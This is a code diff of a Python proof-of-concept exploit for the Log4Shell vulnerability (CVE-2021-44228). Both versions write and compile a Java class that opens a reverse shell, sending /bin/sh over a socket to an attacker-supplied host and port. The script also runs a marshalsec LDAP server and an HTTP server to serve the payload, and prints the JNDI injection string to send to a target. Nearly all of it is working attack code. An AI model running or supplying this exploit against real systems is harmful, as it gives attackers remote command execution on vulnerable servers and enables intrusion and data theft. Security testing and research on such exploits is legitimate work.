@@ -1,204 +1,144 @@
 #!/usr/bin/env python3
 
 import argparse
+from colorama import Fore, init
 import subprocess
 import threading
-import sys
-import socket
 from pathlib import Path
+import os
 from http.server import HTTPServer, SimpleHTTPRequestHandler
-from colorama import Fore, init
 
-CUR_DIR = Path(__file__).parent.resolve()
-JDK_DIR = CUR_DIR / "jdk1.8.0_20"
-JAVAC_PATH = JDK_DIR / "bin" / "javac"
-JAVA_PATH = JDK_DIR / "bin" / "java"
-MARSHALSEC_JAR = CUR_DIR / "target" / "marshalsec-0.0.3-SNAPSHOT-all.jar"
-LDAP_PORT = 1389
-EXPLOIT_JAVA = CUR_DIR / "Exploit.java"
-EXPLOIT_CLASS = CUR_DIR / "Exploit.class"
+CUR_FOLDER = Path(__file__).parent.resolve()
 
-def get_local_ip() -> str:
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(('8.8.8.8', 80))
-        ip = s.getsockname()[0]
-        s.close()
-        return ip
-    except Exception:
-        return 'localhost'
 
-def generate_payload(callback_host: str, callback_port: int) -> None:
-    java_code = f"""\
-import java.io.IOException;
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.net.Socket;
-
-public class Exploit {{
-    public Exploit() throws Exception {{
-        Thread t = new Thread(() -> {{
-            try {{
-                String host = "{callback_host}";
-                int port = {callback_port};
+def generate_payload(userip: str, lport: int) -> None:
+    program = """
+public class Exploit {
+    public Exploit() throws Exception {
+        Thread t = new Thread(() -> {
+            try {
+                String host = "%s";
+                int port = %d;
                 String cmd = "/bin/sh";
                 Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
-                Socket s = new Socket(host, port);
-                InputStream pi = p.getInputStream(),
-                            pe = p.getErrorStream(),
-                            si = s.getInputStream();
-                OutputStream po = p.getOutputStream(),
-                            so = s.getOutputStream();
-                while (!s.isClosed()) {{
+                java.net.Socket s = new java.net.Socket(host, port);
+                java.io.InputStream pi = p.getInputStream(),
+                        pe = p.getErrorStream(),
+                        si = s.getInputStream();
+                java.io.OutputStream po = p.getOutputStream(),
+                        so = s.getOutputStream();
+                while (!s.isClosed()) {
                     while (pi.available() > 0) so.write(pi.read());
                     while (pe.available() > 0) so.write(pe.read());
                     while (si.available() > 0) po.write(si.read());
                     so.flush();
                     po.flush();
-                    try {{
+                    try {
                         p.exitValue();
                         break;
-                    }} catch (Exception e) {{
-                    }}
+                    } catch (Exception e) {
+                        
+                    }
                     Thread.sleep(50);
-                }}
+                }
                 p.destroy();
                 s.close();
-            }} catch (Exception e) {{
+            } catch (Exception e) {
                 e.printStackTrace();
-            }}
-        }});
+            }
+        });
         t.setDaemon(true);
         t.start();
-    }}
-}}
-"""
-    EXPLOIT_JAVA.write_text(java_code)
-    print(Fore.GREEN + "[+] Exploit.java written")
+    }
+}
 
-    if JAVAC_PATH.exists():
-        javac_cmd = [str(JAVAC_PATH)]
-    else:
-        print(Fore.YELLOW + "[!] Bundled javac not found, using system javac")
-        javac_cmd = ["javac"]
+""" % (userip, lport)
+
+    # writing the exploit to Exploit.java file
+
+    p = Path("Exploit.java")
 
     try:
-        subprocess.run(
-            javac_cmd + [str(EXPLOIT_JAVA)],
-            check=True,
-            capture_output=True,
-            text=True
-        )
-    except subprocess.CalledProcessError as e:
-        print(Fore.RED + f"[-] Compilation failed:\n{e.stderr}")
-        sys.exit(1)
+        p.write_text(program)
+        subprocess.run([os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/javac"), str(p)])
+    except OSError as e:
+        print(Fore.RED + f'[-] Something went wrong {e}')
+        raise e
     else:
-        print(Fore.GREEN + "[+] Exploit.class compiled successfully")
+        print(Fore.GREEN + '[+] Exploit java class created success')
 
 
-def ldap_server(web_host: str, web_port: int) -> None:
-    if not MARSHALSEC_JAR.exists():
-        print(Fore.RED + f"[-] marshalsec JAR not found at {MARSHALSEC_JAR}")
-        sys.exit(1)
+def payload(userip: str, webport: int, lport: int) -> None:
+    generate_payload(userip, lport)
 
-    if JAVA_PATH.exists():
-        java_cmd = [str(JAVA_PATH)]
-    else:
-        print(Fore.YELLOW + "[!] Bundled java not found, using system java")
-        java_cmd = ["java"]
+    print(Fore.GREEN + '[+] Setting up LDAP server\n')
 
-    ldap_ref_url = f"http://{web_host}:{web_port}/#Exploit"
-    payload_string = f"${{jndi:ldap://{web_host}:{LDAP_PORT}/a}}"
-    print(Fore.GREEN + f"[+] Send this payload: {payload_string}\n")
+    # create the LDAP server on new thread
+    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
+    t1.start()
 
-    cmd = java_cmd + [
-        "-cp", str(MARSHALSEC_JAR),
+    # start the web server
+    print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
+    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
+    httpd.serve_forever()
+
+
+def check_java() -> bool:
+    exit_code = subprocess.call([
+        os.path.join(CUR_FOLDER, 'jdk1.8.0_20/bin/java'),
+        '-version',
+    ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+    return exit_code == 0
+
+
+def ldap_server(userip: str, lport: int) -> None:
+    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
+    print(Fore.GREEN + f"[+] Send me: {sendme}\n")
+
+    url = "http://{}:{}/#Exploit".format(userip, lport)
+    subprocess.run([
+        os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
+        "-cp",
+        os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
         "marshalsec.jndi.LDAPRefServer",
-        ldap_ref_url
-    ]
-    try:
-        subprocess.run(cmd, check=True)
-    except subprocess.CalledProcessError as e:
-        print(Fore.RED + f"[-] LDAP server error: {e}")
-        sys.exit(1)
-    except KeyboardInterrupt:
-        pass
-
-
-def start_http_server(web_port: int) -> None:
-    handler = SimpleHTTPRequestHandler
-    httpd = HTTPServer(("0.0.0.0", web_port), handler)
-    print(Fore.GREEN + f"[+] HTTP server running on http://0.0.0.0:{web_port}")
-    try:
-        httpd.serve_forever()
-    except KeyboardInterrupt:
-        pass
+        url,
+    ])
 
 
 def main() -> None:
     init(autoreset=True)
-
     print(Fore.BLUE + """
 [!] CVE: CVE-2021-44228
 [!] Github repo: https://github.com/Jiahong-Guan/log4j-shell-poc
 """)
 
-    default_ip = get_local_ip()
-
-    parser = argparse.ArgumentParser(
-        description="log4shell PoC - CVE-2021-44228",
-        epilog="Make sure you have a netcat listener ready on the specified lport."
-    )
-    parser.add_argument(
-        "--userip",
-        metavar="IP",
-        type=str,
-        default=default_ip,
-        help=f"IP address for the LDAP and HTTP servers (reachable by the target). "
-             f"Default: auto-detected ({default_ip})"
-    )
-    parser.add_argument(
-        "--webport",
-        metavar="PORT",
-        type=int,
-        default=8000,
-        help="Port for the HTTP server (default: 8000)"
-    )
-    parser.add_argument(
-        "--lport",
-        metavar="PORT",
-        type=int,
-        default=9001,
-        help="Port for the reverse shell listener (default: 9001 | use with netcat)"
-    )
+    parser = argparse.ArgumentParser(description='log4shell PoC')
+    parser.add_argument('--userip',
+                        metavar='userip',
+                        type=str,
+                        default='localhost',
+                        help='Enter IP for LDAPRefServer & Shell')
+    parser.add_argument('--webport',
+                        metavar='webport',
+                        type=int,
+                        default='8000',
+                        help='listener port for HTTP port')
+    parser.add_argument('--lport',
+                        metavar='lport',
+                        type=int,
+                        default='9001',
+                        help='Netcat Port')
 
     args = parser.parse_args()
 
-    print(Fore.CYAN + f"[*] Using IP address: {args.userip}")
-
     try:
-        generate_payload(args.userip, args.lport)
-
-        ldap_thread = threading.Thread(
-            target=ldap_server,
-            args=(args.userip, args.webport),
-            daemon=True
-        )
-        ldap_thread.start()
-
-        start_http_server(args.webport)
-
+        if not check_java():
+            print(Fore.RED + '[-] Java is not installed inside the repository')
+            raise SystemExit(1)
+        payload(args.userip, args.webport, args.lport)
     except KeyboardInterrupt:
-        print(Fore.RED + "\n[!] Interrupted by user.")
-        sys.exit(0)
-    except Exception as e:
-        print(Fore.RED + f"[-] Unexpected error: {e}")
-        sys.exit(1)
-    finally:
-        for f in (EXPLOIT_JAVA, EXPLOIT_CLASS):
-            if f.exists():
-                f.unlink()
-                print(Fore.YELLOW + f"[+] Cleaned up {f.name}")
+        print(Fore.RED + "user interrupted the program.")
+        raise SystemExit(0)
 
 
 if __name__ == "__main__":
